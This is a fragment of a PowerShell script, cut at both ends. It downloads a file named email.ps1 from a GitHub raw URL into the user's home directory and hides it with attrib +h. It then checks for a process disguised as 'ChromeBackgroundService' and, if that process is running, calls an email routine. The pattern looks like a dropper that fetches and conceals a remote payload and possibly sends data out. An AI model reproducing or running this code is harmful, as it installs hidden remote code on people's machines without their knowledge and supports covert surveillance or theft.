...
if( -not (Test-Path -Path $homedir\email.ps1 -PathType Leaf)){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1; attrib +h $homedir\email.ps1}
...
$tsk = Get-Process ChromeBackgroundService -ErrorAction SilentlyContinue
if ($tsk) {
email
exit
} else {
